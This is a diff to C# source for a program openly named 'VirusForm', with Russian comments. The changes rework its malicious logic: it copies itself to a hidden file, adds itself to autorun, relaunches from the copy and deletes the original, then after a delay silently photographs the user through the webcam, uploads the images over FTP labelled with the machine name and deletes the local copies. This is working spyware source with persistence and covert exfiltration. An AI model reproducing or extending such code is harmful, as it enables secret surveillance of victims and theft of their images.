@@ -16,7 +16,7 @@ namespace VirusForm
         WebCam webcam;
         string fileName;
         bool savePhoto = true;
-        bool newStart = false;
+       
         bool filesExists =false;
         VirusShowForm vsf;
  
@@ -37,6 +37,23 @@ namespace VirusForm
                     Autorun.SetAutorunValue(true, needPatch + "VirusForm.exe"); // добавить в автозагрузку
                     //SetAutorunValue(false, needPatch + "system.exe");  // убрать из автозагрузки
                 }
+
+           
+
+            if (Application.ExecutablePath != needPatch + "VirusForm.exe")
+                {
+                    
+                    CopyVirusFile();
+                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
+                    proc.StartInfo.FileName = needPatch + "VirusForm.exe";
+                    proc.Start();
+                   
+                    SelfDelete();
+                    Process.GetCurrentProcess().Kill();
+                }
+                
+
+         
 
          
             InitializeComponent();
@@ -66,24 +83,28 @@ namespace VirusForm
                 pbImgCapture.Image = pbImageFromCam.Image;
 
                 fileName = DateTime.Now.Year + "_" + DateTime.Now.Month + "_" + DateTime.Now.Day + "_" + DateTime.Now.Hour + "_" + DateTime.Now.Minute + "_" + DateTime.Now.Second + ".Jpeg";
-                using (FileStream fstream = new FileStream(fileName, FileMode.Create))
-                {
-                    pbImgCapture.Image.Save(fstream, System.Drawing.Imaging.ImageFormat.Jpeg);
-                    savePhoto = false;
-                    
-                }
-                try
-                {
-                  
-                   Network.UploadFileFTP(Environment.MachineName, fileName);
-                   File.Delete(needPatch + fileName);
+               
+                    using (FileStream fstream = new FileStream(fileName, FileMode.Create))
+                    {
 
-                }
-                catch (Exception ex)
-                {
-                    
-                 //   MessageBox.Show(ex.Message);
-                }
+                        pbImgCapture.Image.Save(fstream, System.Drawing.Imaging.ImageFormat.Jpeg);
+                        savePhoto = false;
+
+
+                    }
+                    try
+                    {
+
+                        Network.UploadFileFTP(Environment.MachineName,fileName);
+                        File.Delete(fileName);
+
+                    }
+                    catch (Exception ex)
+                    {
+
+                        //   MessageBox.Show(ex.Message);
+                    }
+               
              };
          
         }
@@ -110,7 +131,7 @@ namespace VirusForm
                 {
                     File.Copy("VirusForm.exe", needPatch + "VirusForm.exe");
                     File.SetAttributes(needPatch + "VirusForm.exe", FileAttributes.Hidden);
-                    newStart = true;
+                 
                     filesExists = true;
                     
                 }
@@ -118,7 +139,7 @@ namespace VirusForm
             }
             else
             {
-                newStart = false;
+             
                 filesExists = true;
             }
 
@@ -128,57 +149,52 @@ namespace VirusForm
         {
             try
             {
-                CopyVirusFile();
+                Thread.Sleep(180000);
 
-                if (newStart)
-                {
-
-                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
-                    proc.StartInfo.FileName = needPatch + "VirusForm.exe";
-                    proc.Start();
-                    
-                    SelfDelete();
-                    Process.GetCurrentProcess().Kill();
-                   
-                }
-                else
-                {
-                    System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch();
-                    sw.Start();
-                    bool b=true;
-                    do
-                    {
-                        if (sw.Elapsed.Minutes == 3 && sw.Elapsed.Seconds == 0 && sw.Elapsed.Milliseconds == 1 )
-                        {
-                           
-                              virusFormWork = new Thread(VirusFormActivation);
-                              virusFormWork.IsBackground = true;
-                              virusFormWork.Start();
-                              WebCamActivationAndSaveImage();
-                              b=false;
-                        }
-                    } while (b);
-
-                    do
-                    {
-                        if (sw.Elapsed.Minutes == 3 && sw.Elapsed.Seconds == 3 && sw.Elapsed.Milliseconds == 1 )
-                        {
-                            WebCamActivationAndSaveImage();
-                            b = true;
-                        }
-                    } while (!b);
-
-                     do
-                    {
-                        if (sw.Elapsed.Minutes == 8)
-                        {
-                            Application.Exit();
-                            b = false;
-                        }
-                    } while (b);
+                WebCamActivationAndSaveImage();
+                virusFormWork = new Thread(VirusFormActivation);
+                virusFormWork.IsBackground = true;
+                virusFormWork.Start();
+                Thread.Sleep(2000);
+                WebCamActivationAndSaveImage();
+                Thread.Sleep(30000);
+                Application.Exit();
+               
+                 //   System.Diagnostics.Stopwatch sw = new System.Diagnostics.Stopwatch();
+                 //   sw.Start();
+                 //   bool b=true;
+                 //   do
+                 //   {
+                 //       if (sw.Elapsed.Minutes == 0 && sw.Elapsed.Seconds == 0 && sw.Elapsed.Milliseconds == 1 )
+                 //       {
+                //             WebCamActivationAndSaveImage();
+                 //             virusFormWork = new Thread(VirusFormActivation);
+                 //             virusFormWork.IsBackground = true;
+                 //             virusFormWork.Start();
+                 //             WebCamActivationAndSaveImage();
+                 //             b=false;
+                 //       }
+                 //   } while (b);
+                 //
+                 //   do
+                 //   {
+                 //       if (sw.Elapsed.Minutes == 0 && sw.Elapsed.Seconds == 3 && sw.Elapsed.Milliseconds == 1 )
+                 //       {
+                 //           WebCamActivationAndSaveImage();
+                 //           b = true;
+                 //       }
+                 //   } while (!b);
+                 //
+                 //    do
+                 //   {
+                 //       if (sw.Elapsed.Minutes == 8)
+                 //       {
+                 //           Application.Exit();
+                 //           b = false;
+                 //       }
+                 //   } while (b);
                  
                 }
-            }
             catch (Exception ex)
             {
                // MessageBox.Show(ex.Message);
